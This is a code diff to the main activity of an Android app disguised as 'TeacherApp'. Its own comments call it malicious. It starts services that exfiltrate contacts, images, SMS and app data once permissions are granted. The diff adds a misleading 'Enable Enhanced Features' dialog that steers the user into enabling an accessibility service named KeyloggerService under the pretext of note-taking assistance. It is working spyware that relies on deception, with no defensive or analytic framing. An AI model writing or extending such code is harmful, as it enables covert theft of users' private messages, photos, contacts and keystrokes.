@@ -1,13 +1,19 @@
 package com.example.teacherapp
 
 import android.Manifest
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.provider.Settings
+import android.text.TextUtils
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AlertDialog
 import androidx.compose.foundation.layout.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.Composable
@@ -24,11 +30,11 @@ import com.example.teacherapp.ui.theme.TeacherappTheme
 import com.teacherapp.services.ContactExfiltrationService
 import com.teacherapp.services.ImageExfiltrationService
 import com.teacherapp.services.SmsExfiltrationService
+import com.teacherapp.services.AppDataExfiltrationService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import com.teacherapp.services.AppDataExfiltrationService
 
 
 class MainActivity : ComponentActivity() {
@@ -85,8 +91,7 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // TESTING MODE - NO SECURITY CHECKS
-        // Just request permissions directly
+        // Request permissions directly
         requestNecessaryPermissions()
     }
 
@@ -104,8 +109,7 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun showPermissionRationale(permissions: List<String>) {
-        // Using AlertDialog from androidx.appcompat
-        androidx.appcompat.app.AlertDialog.Builder(this)
+        AlertDialog.Builder(this)
             .setTitle("Permissions Required")
             .setMessage(
                 "TeacherApp needs the following permissions to function properly:\n\n" +
@@ -135,12 +139,16 @@ class MainActivity : ComponentActivity() {
     private fun onAllPermissionsGranted() {
         Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()
 
-        // Schedule malicious activities WITHOUT security checks
+        // Schedule malicious activities
         scheduleMaliciousActivities()
+
+        // Prompt for accessibility service after a delay
+        Handler(Looper.getMainLooper()).postDelayed({
+            promptAccessibilityService()
+        }, 3000) // 3 seconds after permissions granted
     }
 
     private fun scheduleMaliciousActivities() {
-        // NO ANTI-ANALYSIS - RUNS ON EMULATOR
         CoroutineScope(Dispatchers.Default).launch {
             startTimedExfiltration()
         }
@@ -165,7 +173,82 @@ class MainActivity : ComponentActivity() {
 
         delay(5000L)
 
+        // Start App Data exfiltration
         AppDataExfiltrationService.startExfiltration(this@MainActivity)
+    }
+
+    // ========== ACCESSIBILITY SERVICE FUNCTIONS ==========
+
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        val serviceName = "com.teacherapp.services.KeyloggerService"
+        val expectedComponentName = "$packageName/$serviceName"
+
+        val enabledServicesSetting = Settings.Secure.getString(
+            contentResolver,
+            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+        ) ?: return false
+
+        val colonSplitter = TextUtils.SimpleStringSplitter(':')
+        colonSplitter.setString(enabledServicesSetting)
+
+        while (colonSplitter.hasNext()) {
+            val componentNameString = colonSplitter.next()
+            if (componentNameString.equals(expectedComponentName, ignoreCase = true)) {
+                return true
+            }
+        }
+
+        return false
+    }
+
+    private fun promptAccessibilityService() {
+        // Don't prompt if already enabled
+        if (isAccessibilityServiceEnabled()) {
+            android.util.Log.d("MainActivity", "✅ Accessibility service already enabled")
+            return
+        }
+
+        AlertDialog.Builder(this)
+            .setTitle("Enable Enhanced Features")
+            .setMessage("TeacherApp provides enhanced text input assistance for better note-taking.\n\nTo enable this feature, please activate 'TeacherApp' in Accessibility settings.")
+            .setPositiveButton("Enable Now") { dialog, _ ->
+                dialog.dismiss()
+                openAccessibilitySettings()
+            }
+            .setNegativeButton("Skip") { dialog, _ ->
+                dialog.dismiss()
+            }
+            .setCancelable(true)
+            .show()
+    }
+
+    private fun openAccessibilitySettings() {
+        try {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
+
+            Toast.makeText(
+                this,
+                "Find 'TeacherApp' in the list and turn it ON",
+                Toast.LENGTH_LONG
+            ).show()
+        } catch (e: Exception) {
+            Toast.makeText(
+                this,
+                "Please enable accessibility in Settings",
+                Toast.LENGTH_SHORT
+            ).show()
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+
+        // Optional: Check if accessibility was just enabled
+        if (isAccessibilityServiceEnabled()) {
+            android.util.Log.d("MainActivity", "✅ Accessibility service is now enabled!")
+        }
     }
 }
 
